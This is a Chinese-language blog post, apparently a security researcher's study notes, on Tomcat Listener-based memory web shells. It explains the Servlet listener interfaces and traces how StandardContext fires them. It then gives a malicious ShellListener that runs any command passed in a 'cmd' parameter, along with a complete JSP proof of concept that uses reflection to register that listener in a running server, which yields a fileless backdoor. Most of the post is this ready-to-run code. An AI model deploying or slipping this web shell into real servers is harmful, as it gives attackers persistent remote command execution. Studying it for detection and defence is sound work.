## Listener

Listener 可以译为监听器，监听器用来监听对象或者流程的创建与销毁，通过 Listener，可以自动触发一些操作

在应用中可能调用的监听器如下：

- ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
- ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
- ServletRequestListener：对 Request 请求进行监听（创建、销毁）
- ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
- javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
- javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听

可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。

ServletRequestListener用于监听ServletRequest对象的，当访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法

**实现一个恶意的listener**

```java
package org.example.javaweb;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@WebListener
public class ShellListener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre){
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        if(cmd !=null){
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre){}
}

```

访问任意路由使用对应的参数可以触发

![image-20240703205108067](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240703205108067.png)

将断点下在requestInitialized方法处，看调用栈

![image-20240703205341282](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240703205341282.png)



**StandardContext#fireRequestInitEvent**

![image-20240703210008539](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240703210008539.png)

该方法首先定义了一个instances数组，调用getApplicationEvenListeners()来获取listener对象，后续遍历event，依次调用listerner.requestInitialized解析event

![image-20240703210436316](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240703210436316.png)

跟进到**getApplicationEvenListeners()方法**

![image-20240717170944701](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240717170944701.png)

listener对象存储在该字段当中

通过StandardContext#addApplicationEventListener()来进行listener的添加

![image-20240717171006216](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240717171006216.png)

### POC编写

**获取standardContext对象**

```jsp
<%
    //获取ApplicationContextFaced类
    ServletContext servletContext = request.getSession().getServletContext();
    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
    Field appContext = servletContext.getClass().getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    //获取StandardContext
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
%>

```

**构造恶意listener**

```java
public class ShellListener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre){
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        if(cmd !=null){
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre){}
}
```

**最后添加监听器**

```jsp
<%
    ShellListener shellListener = new ShellListener();
    standardContext.addApplicationEventListener(shellListener);
%>
```

**完整poc**

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
  Created by IntelliJ IDEA.
  User: Administrator
  Date: 2024/7/3
  Time: 21:24
  To change this template use File | Settings | File Templates.
--%>
<%
    //获取ApplicationContextFaced类
    ServletContext servletContext = request.getSession().getServletContext();
    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
    Field appContext = servletContext.getClass().getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    //获取StandardContext
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
%>
<%!
    public class ShellListener implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre){
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if(cmd !=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
        @Override
        public void requestDestroyed(ServletRequestEvent sre){}
    }
%>
<%
    ShellListener shellListener = new ShellListener();
    standardContext.addApplicationEventListener(shellListener);
%>
```

![image-20240703213129811](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240703213129811.png)

效果如上

